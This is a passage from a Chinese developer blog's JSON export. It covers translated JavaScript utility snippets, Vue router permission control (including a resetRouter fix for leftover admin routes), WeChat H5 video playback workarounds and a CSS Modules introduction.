[&#x27;abc&#x27;,&#x27;acb&#x27;,&#x27;bac&#x27;,&#x27;bca&#x27;,&#x27;cab&#x27;,&#x27;cba&#x27;] Capitalize first letter of every word (所有单词的第一个字母大写)使用 replace() 去查找单词的第一个字母并使用 toUpperCase() 改为大写。 12const capitalizeEveryWord = str =&gt; str.replace(/\\b[a-z]/g, char =&gt; char.toUpperCase());// capitalizeEveryWord(&#x27;hello world!&#x27;) -&gt; &#x27;Hello World!&#x27; Capitalize first letter (单词的第一个字母大写)使用 slice(0,1) 和 toUpperCase() 将首字母大写，使用 slice(1) 得到字符串的其余部分。忽略 lowerRest 参数以保持字符串的其余部分不变，或者将其设置为 true 以转换为小写字母。 123const capitalize = (str, lowerRest = false) =&gt; str.slice(0, 1).toUpperCase() + (lowerRest ? str.slice(1).toLowerCase() : str.slice(1));// capitalize(&#x27;myName&#x27;, true) -&gt; &#x27;Myname&#x27; Check for palindrome (检查回文)使用 toLowerCase() 转换字符串并用 replace() 删除其中的非字母数字字符。然后，使用 split(‘’) 分散为单个字符，再使用 reverse() 和 join(‘’) 倒序合并后与原字符进行比较。 12345const palindrome = str =&gt; &#123; const s = str.toLowerCase().replace(/[\\W_]/g,&#x27;&#x27;); return s === s.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);&#125;// palindrome(&#x27;taco cat&#x27;) -&gt; true Reverse a string (反转一个字符串)使用数组解构和 Array.reverse() 来反转字符串中字符的顺序。使用 join(‘’) 组合字符获得一个字符串。 12const reverseString = str =&gt; [...str].reverse().join(&#x27;&#x27;);// reverseString(&#x27;foobar&#x27;) -&gt; &#x27;raboof&#x27; Sort characters in string (alphabetical) 字符串排序（按字母顺序排列）使用 split(‘’) 切割字符串，使用 Array.sort 通过 localeCompare() 去排序，再使用 join(‘’) 组合。 123const sortCharactersInString = str =&gt; str.split(&#x27;&#x27;).sort((a, b) =&gt; a.localeCompare(b)).join(&#x27;&#x27;);// sortCharactersInString(&#x27;cabbage&#x27;) -&gt; &#x27;aabbceg&#x27; Truncate a String (字符串截断)确定字符串的长度是否大于 num。将字符串截断为所需的长度，在末尾或原始字符串后附加 …。 123const truncate = (str, num) =&gt; str.length &gt; num ? str.slice(0, num &gt; 3 ? num - 3 : num) + &#x27;...&#x27; : str;// truncate(&#x27;boomerang&#x27;, 7) -&gt; &#x27;boom...&#x27; Utility (效率工具)Escape regular expression (转义正则表达式)使用 replace() 去转义特殊字符。 12const escapeRegExp = str =&gt; str.replace(/[.*+?^$&#123;&#125;()|[\\]\\\\]/g, &#x27;\\\\$&amp;&#x27;);// escapeRegExp(&#x27;(test)&#x27;) -&gt; \\\\(test\\\\) Get native type of value (获取值的原始类型)返回值的构造函数名称的小写字符，值为 undefined 或 null 时则返回 undefined 或 null。 123const getType = v =&gt; v === undefined ? &#x27;undefined&#x27; : v === null ? &#x27;null&#x27; : v.constructor.name.toLowerCase();// getType(new Set([1,2,3])) -&gt; &quot;set&quot; Is array (是否是数组)使用 Array.isArray() 去检查值是否为数组。 123const isArray = val =&gt; !!val &amp;&amp; Array.isArray(val);// isArray(null) -&gt; false// isArray([1]) -&gt; true Is boolean (是否为布尔值)使用 typeof 去检查值是否为原始布尔值类型。 123const isBoolean = val =&gt; typeof val === &#x27;boolean&#x27;;// isBoolean(null) -&gt; false// isBoolean(false) -&gt; true Is function (是否为函数)使用 typeof 去检查值是否为函数原始类型。 123const isFunction = val =&gt; val &amp;&amp; typeof val === &#x27;function&#x27;;// isFunction(&#x27;x&#x27;) -&gt; false// isFunction(x =&gt; x) -&gt; true Is number (是否为数值)使用 typeof 去检查值是否为数值原始类型。 123const isNumber = val =&gt; typeof val === &#x27;number&#x27;;// isNumber(&#x27;1&#x27;) -&gt; false// isNumber(1) -&gt; true Is string (是否为字符串)使用 typeof 去检查值是否为字符串原始类型。 123const isString = val =&gt; typeof val === &#x27;string&#x27;;// isString(10) -&gt; false// isString(&#x27;10&#x27;) -&gt; true Is symbol (是否为 symbol 类型)使用 typeof 去检查值是否为 symbol 原始类型。 123const isSymbol = val =&gt; typeof val === &#x27;symbol&#x27;;// isSymbol(&#x27;x&#x27;) -&gt; false// isSymbol(Symbol(&#x27;x&#x27;)) -&gt; true Measure time taken by function (测量函数的耗时)使用 console.time() 和 console.timeEnd() 来测量开始和结束时间之间的差异，以确定回调执行的时间。 12345678const timeTaken = callback =&gt; &#123; console.time(&#x27;timeTaken&#x27;); const r = callback(); console.timeEnd(&#x27;timeTaken&#x27;); return r;&#125;;// timeTaken(() =&gt; Math.pow(2, 10)) -&gt; 1024// (logged): timeTaken: 0.02099609375ms Number to array of digits (数值转换为数组)将数值转换为字符串，使用 split() 分割为数组。再使用 Array.map() 和 parseInt() 将每个值转换为整数。 12const digitize = n =&gt; (&#x27;&#x27;+n).split(&#x27;&#x27;).map(i =&gt; parseInt(i));// digitize(2334) -&gt; [2, 3, 3, 4] Ordinal suffix of number （数值增加序号后缀）Use the modulo operator (%) to find values of single and tens digits.Find which ordinal pattern digits match.If digit is found in teens pattern, use teens ordinal. 使用模运算符（％）来查找单位数和十位数的值。查找数字匹配哪些序号模式。如果数字在十几的模式中找到，请使用的十几的序数。 1234567const toOrdinalSuffix = num =&gt; &#123; const int = parseInt(num), digits = [(int % 10), (int % 100)], ordinals = [&#x27;st&#x27;, &#x27;nd&#x27;, &#x27;rd&#x27;, &#x27;th&#x27;], oPattern = [1, 2, 3, 4], tPattern = [11, 12, 13, 14, 15, 16, 17, 18, 19]; return oPattern.includes(digits[0]) &amp;&amp; !tPattern.includes(digits[1]) ? int + ordinals[digits[0] - 1] : int + ordinals[3];&#125;;// toOrdinalSuffix(&quot;123&quot;) -&gt; &quot;123rd&quot; Random integer in range (指定范围内的随机整数)使用 Math.random() 去生成一个在指定范围内的随机数，使用 Math.floor() 将其转换为整数。 12const randomIntegerInRange = (min, max) =&gt; Math.floor(Math.random() * (max - min + 1)) + min;// randomIntegerInRange(0, 5) -&gt; 2 Random number in range (指定范围内的随机数)使用 Math.random() 去生成一个在指定范围内的随机数。 12const randomInRange = (min, max) =&gt; Math.random() * (max - min) + min;// randomInRange(2,10) -&gt; 6.0211363285087005 RGB to hexadecimal (RGB转十六进制)使用按位左移运算符（&lt;&lt;）和 toString(16) 将 RGB 参数转换为十六进制，然后使用 padStart(6, ‘0’) 去获取6位数的十六进制。 12const rgbToHex = (r, g, b) =&gt; ((r &lt;&lt; 16) + (g &lt;&lt; 8) + b).toString(16).padStart(6, &#x27;0&#x27;);// rgbToHex(255, 165, 1) -&gt; &#x27;ffa501&#x27; Swap values of two variables (交换两个变量的值)使用数组解构来交换两个变量之间的值。 12[varA, varB] = [varB, varA];// [x, y] = [y, x] URL parameters （URL参数）使用 match() 和一个合适的正则去获取所有键值对，使用 Array.reduce() 合并到一个对象中。允许将 location.search 作为参数传递。 12345const getUrlParameters = url =&gt; url.match(/([^?=&amp;]+)(=([^&amp;]*))/g).reduce( (a, v) =&gt; (a[v.slice(0, v.indexOf(&#x27;=&#x27;))] = v.slice(v.indexOf(&#x27;=&#x27;) + 1), a), &#123;&#125; );// getUrlParameters(&#x27;http://url.com/page?name=Adam&amp;surname=Smith&#x27;) -&gt; &#123;name: &#x27;Adam&#x27;, surname: &#x27;Smith&#x27;&#125; UUID generator （UUID生成器）使用 crypto API 生成符合 RFC4122 版本4的UUID。 12345const uuid = _ =&gt; ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =&gt; (c ^ crypto.getRandomValues(new Uint8Array(1))[0] &amp; 15 &gt;&gt; c / 4).toString(16) );// uuid() -&gt; &#x27;7982fcfe-5721-4632-bede-6000885be57d&#x27; Validate email （校验邮箱）Use a regular experssion to check if the email is valid.Returns true if email is valid, false if not. 使用正则表达式去检验邮箱格式。返回 true 表示邮箱格式正确，false 则不正确。 123const validateEmail = str =&gt; /^(([^&lt;&gt;()\\[\\]\\\\.,;:\\s@&quot;]+(\\.[^&lt;&gt;()\\[\\]\\\\.,;:\\s@&quot;]+)*)|(&quot;.+&quot;))@((\\[[0-9]&#123;1,3&#125;\\.[0-9]&#123;1,3&#125;\\.[0-9]&#123;1,3&#125;\\.[0-9]&#123;1,3&#125;\\])|(([a-zA-Z\\-0-9]+\\.)+[a-zA-Z]&#123;2,&#125;))$/.test(str);// validateEmail(mymail@gmail.com) -&gt; true Validate number （校验数值）使用 !isNaN 和 parseFloat() 来检查参数是否是一个数字（或允许转换为数值）。使用 isFinite() 来检查数字是否是有限的。使用 Number() 来检查数值转换是否成立。 12const validateNumber = n =&gt; !isNaN(parseFloat(n)) &amp;&amp; isFinite(n) &amp;&amp; Number(n) == n;// validateNumber(&#x27;10&#x27;) -&gt; true Value or default （值或默认值）默认返回 value 如果 value 为假，则返回默认值。 12const valueOrDefault = (value, d) =&gt; value || d;// valueOrDefault(NaN, 30) -&gt; 30","categories":[{"name":"日常学习","slug":"日常学习","permalink":"http://www.jspeng.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"javaScript","slug":"javaScript","permalink":"http://www.jspeng.com/tags/javaScript/"},{"name":"翻译","slug":"翻译","permalink":"http://www.jspeng.com/tags/%E7%BF%BB%E8%AF%91/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"关于VUE的路由权限管理","slug":"关于VUE的路由权限管理","date":"2018-07-26T21:06:32.000Z","updated":"2018-07-26T21:58:33.000Z","comments":true,"path":"2018/07/27/关于VUE的路由权限管理/","link":"","permalink":"http://www.jspeng.com/2018/07/27/%E5%85%B3%E4%BA%8EVUE%E7%9A%84%E8%B7%AF%E7%94%B1%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/","excerpt":"","text":"前言曾经在工作上对 vue 路由权限管理这方面有过研究，这几天又看到了几篇相关的文章，再加上昨天电面中又再一次提及到，就索性整理了一下自己的一些看法，希望对大家有帮助。 实现大体上实现的思路很简单，先上图： 无非是将路由配置按用户类型分割为 用户路由 和 基本路由，不同的用户类型可能存在不同的 用户路由，具体依赖实际业务。 用户路由: 当前用户所特有的路由 基本路由：所有用户均可以访问的路由 实现控制的方式分两种： 通过 vue-router addRoutes 方法注入路由实现控制 通过 vue-router beforeEach 钩子限制路由跳转 addRoutes 方式 通过请求服务端获取当前用户路由配置，编码为 vue-router 所支持的基本格式（具体如何编码取决于前后端协商好的数据格式），通过调用 this.$router.addRoutes 方法将编码好的用户路由注入到现有的 vue-router 实例中去，以实现用户路由。 beforeEach 方式 通过请求服务端获取当前用户路由配置，通过注册 router.beforeEach 钩子对路由的每次跳转进行管理，每次跳转都进行检查，如果目标路由不存再于 基本路由 和 当前用户的 用户路由 中，取消跳转，转为跳转错误页。 以上两种方式均需要在 vue-router 中配置错误页，以保证用户感知权限不足。 两种方式的原理其实都是一样的，只不过 addRoutes 方式 通过注入路由配置告诉 vue-router ：“当前我们就只有这些路由，其它路由地址我们一概不认”，而 beforeEach 则更多的是依赖我们手动去帮 vue-router 辨别什么页面可以去，什么页面不可以去。说白了也就是 自动 与 手动 的差别。说到这，估计大家都会觉得既然是 自动 的，那肯定是 addRoutes 最方便快捷了，还能简化业务代码，笔者一开始也是这么认为的，但是！很多人都忽略了一点： addRoutes 方法仅仅是帮你注入新的路由，并没有帮你剔除其它路由！ 设想存在这么一种情况：用户在自己电脑上登录了管理员账号，这个时候会向路由中注入管理员的路由，然后再退出登录，保持页面不刷新，改用普通用户账号进行登录，这个时候又会向路由中注入普通用户的路由，那么，在路由中将存在两种用户类型的路由，即使用户不感知，通过改变 url，普通用户也可以访问管理员的页面！ 对于这个问题，也有一个解决办法： 123456789101112131415161718import Vue from &#x27;vue&#x27;import Router from &#x27;vue-router&#x27;Vue.use(Router)const createRouter = () =&gt; new Router(&#123; mode: &#x27;history&#x27;, routes: []&#125;)const router = createRouter()export function resetRouter () &#123; const newRouter = createRouter() router.matcher = newRouter.matcher&#125;export default router 通过新建一个全新的 Router，然后将新的 Router.matcher 赋给当前页面的管理 Router，以达到更新路由配置的目的。","categories":[{"name":"日常学习","slug":"日常学习","permalink":"http://www.jspeng.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"vue","slug":"vue","permalink":"http://www.jspeng.com/tags/vue/"},{"name":"javaScript","slug":"javaScript","permalink":"http://www.jspeng.com/tags/javaScript/"},{"name":"权限管理","slug":"权限管理","permalink":"http://www.jspeng.com/tags/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"微信视频H5开发小结","slug":"微信视频H5开发小结","date":"2017-12-11T01:05:42.000Z","updated":"2017-12-11T01:49:11.000Z","comments":true,"path":"2017/12/11/微信视频H5开发小结/","link":"","permalink":"http://www.jspeng.com/2017/12/11/%E5%BE%AE%E4%BF%A1%E8%A7%86%E9%A2%91H5%E5%BC%80%E5%8F%91%E5%B0%8F%E7%BB%93/","excerpt":"","text":"前言近日，由于工作原因，需要开发一款视频类 h5。玩法很简单，用户滚页面至底部，切换全屏视频播放。 准备全屏同层播放为了满足交互需求，需要达到全屏同层播放，具体配置如下： 1234567&lt;video id=&quot;my-video&quot; type=&quot;video/mp4&quot; x5-video-player-fullscreen=&quot;false&quot; webkit-playsinline playsinline x-webkit-airplay=&quot;allow&quot; x5-video-player-type=&quot;h5&quot; src=&quot;www.baidu.com&quot;&gt;&lt;/video&gt; 视频预加载由于该 H5 为视频类 H5 ，在移动端播放视频还是要考虑到加载速度及稳定播放等问题，因此笔者采用的是 “边播边加载” 的方式，利用 video 标签的 canplaythrough 事件作为页面加载完成的标志。 由于移动端原因， video 并不会主动去预加载用户未需求的资源，因此我们需要手动去触发 video 的预加载资源， 1document.getElementById(&#x27;my-video&#x27;).play(); 这样就可以了吗？ 不，万恶的微信限制了必须用户行为才能播放媒体资源，因此我们只能再祭出万能 hack： 1234567891011121314151617document.addEventListener(&#x27;DOMContentLoaded&#x27;, function() &#123; let video = document.getElementById(&#x27;my-video&#x27;); function preload() &#123; video.play(); setTimeout(function () &#123; video.pause(); &#125;, 200); &#125; document.addEventListener(&quot;WeixinJSBridgeReady&quot;, preload, false); if (typeof WeixinJSBridge == &quot;object&quot; &amp;&amp; typeof WeixinJSBridge.invoke == &quot;function&quot;) &#123; WeixinJSBridge.invoke(&quot;getNetworkType&quot;, &#123;&#125;, preload); &#125; preload(); &#125;); 槽点布局限制安卓端由于无法像 ios 端完美的实现全屏播放，播放视频时手机依旧会进入媒体播放模式，这就导致了播放视频时会连带着媒体播放层的弹出，而媒体播放层则类似于 position: fixed; top: 0; left: 0; 的效果固定在页面顶部，每个媒体播放层的弹出，都会预先将页面滚动至顶部，如果页面发生滚动，在安卓端播放视频就会出现短暂的黑屏。 因此，微信视频类 H5 如果需要滚动存在，请采用局部滚动。 用户行为限制安卓端下，滚动行为不归属在用户操作行为中，滚动事件中无法执行视频播放，在这个问题上，笔者使用 touchstart 对安卓端进行 hack。 参考文献 video 标签在微信浏览器的问题解决方法 微信内置浏览器 如何小窗不全屏播放视频？","categories":[{"name":"经验总结","slug":"经验总结","permalink":"http://www.jspeng.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"weChat","slug":"weChat","permalink":"http://www.jspeng.com/tags/weChat/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"Css Modules 小试","slug":"Css Modules 小试","date":"2017-11-11T05:34:33.000Z","updated":"2017-11-11T06:35:57.000Z","comments":true,"path":"2017/11/11/Css Modules 小试/","link":"","permalink":"http://www.jspeng.com/2017/11/11/Css%20Modules%20%E5%B0%8F%E8%AF%95/","excerpt":"","text":"定义一个css模块即一个定义好了所有样式（类）和动画名称的本地css文件 官方推荐仅使用类来定义样式 CSS Modules 会编译成一种低层级的ICSS，但它的格式与正常css格式相似 1234/* style.css */.className &#123; color: green;&#125; 当使用js模块导入css模块时，它输出一个属性与本地样式名称相对应的对象 123import styles from &#x27;./style.css&#x27;;element.innerHTML = &#x27;&lt;div class=&quot;&#x27; + styles.className + &#x27;&quot;&gt;&#x27;; 命名对于本地类名建议使用驼峰命名，但并非强制 关于使用驼峰命名的方式主要是为了更好在js中导入并使用css模块 可以为css-loader增加camelCase参数来实现自动转换 1234&#123; test: /\\.css$/, loader: &#x27;style!css?modules&amp;camelCase&#x27;,&#125; 作用域:global: 切换到当前选择器所在全局作用域下:local: 切换到局部作用域下 如果切换到全局模式下，定义的样式将允许在全局作用域中使用 Example: 1localA :global .global-b .global-c :local(.localD.localE) .global-d 组合用于组合其它选择器 123456789.className &#123; color: green; background: red;&#125;.otherClassName &#123; composes: className; color: yellow;&#125; 允许拥有多个组成规则，但组成规则必须先于其它规则。当一个类composes另外一个类时，css模块对外的接口为当前类名，允许添加多个类名。 组成规则允许使用多个类：composes: classNameA classNameB 依赖允许compose其它CSS Modules的类名 123.otherClassName &#123; composes: className from &#x27;./style.css&#x27;;&#125; 注意： 当从不同的文件composes多个类时，compose的顺序是不确定的，因此，需要确保composes的类没有定义相同的属性值 compose不应该循环嵌套，因为Elsewise是无法确定这是组成规则还是属性，模块系统将会发出一个错误。 最好的方式就是基本类与依赖分离 为什么使用CSS Modules模块化和可重复使用的css 解决命名冲突 显式依赖 没有全局作用域 编译结果 默认为哈希字符串 允许自定义配置","categories":[{"name":"日常学习","slug":"日常学习","permalink":"http://www.jspeng.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"css","slug":"css","permalink":"http://www.jspeng.com/tags/css/"},{"name":"Css Modules","slug":"Css-Modules","permalink":"http://www.jspeng.com/tags/Css-Modules/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]}],"categories":[{"name":"随笔","slug":"随笔","permalink":"http://www.jspeng.com/categories/%E9%9A%8F%E7%AC%94/"},{"name":"经验总结","slug":"经验总结","permalink":"http://www.jspeng.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"},{"name":"日常学习","slug":"日常学习","permalink":"http://www.jspeng.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"webRTC","slug":"webRTC","permalink":"http://www.jspeng.com/tags/webRTC/"},{"name":"实时音视频","slug":"实时音视频","permalink":"http://www.jspeng.com/tags/%E5%AE%9E%E6%97%B6%E9%9F%B3%E8%A7%86%E9%A2%91/"},{"name":"即时通讯","slug":"即时通讯","permalink":"http://www.jspeng.com/tags/%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://www.jspeng.com/tags/JavaScript/"},{"name":"小程序","slug":"小程序","permalink":"http://www.jspeng.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"vue","slug":"vue","permalink":"http://www.jspeng.com/tags/vue/"},{"name":"http","slug":"http","permalink":"http://www.jspeng.com/tags/http/"},{"name":"网络协议","slug":"网络协议","permalink":"http://www.jspeng.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"},{"name":"web","slug":"web","permalink":"http://www.jspeng.com/tags/web/"},{"name":"服务器","slug":"服务器","permalink":"http://www.jspeng.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"学习","slug":"学习","permalink":"http://www.jspeng.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"百度Ife","slug":"百度Ife","permalink":"http://www.jspeng.com/tags/%E7%99%BE%E5%BA%A6Ife/"},{"name":"总结","slug":"总结","permalink":"http://www.jspeng.com/tags/%E6%80%BB%E7%BB%93/"},{"name":"WeChat","slug":"WeChat","permalink":"http://www.jspeng.com/tags/WeChat/"},{"name":"wepy","slug":"wepy","permalink":"http://www.jspeng.com/tags/wepy/"},{"name":"minUI","slug":"minUI","permalink":"http://www.jspeng.com/tags/minUI/"},{"name":"css","slug":"css","permalink":"http://www.jspeng.com/tags/css/"},{"name":"安全","slug":"安全","permalink":"http://www.jspeng.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"javaScript","slug":"javaScript","permalink":"http://www.jspeng.com/tags/javaScript/"},{"name":"翻译","slug":"翻译","permalink":"http://www.jspeng.com/tags/%E7%BF%BB%E8%AF%91/"},{"name":"权限管理","slug":"权限管理","permalink":"http://www.jspeng.com/tags/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"},{"name":"weChat","slug":"weChat","permalink":"http://www.jspeng.com/tags/weChat/"},{"name":"Css Modules","slug":"Css-Modules","permalink":"http://www.jspeng.com/tags/Css-Modules/"}]}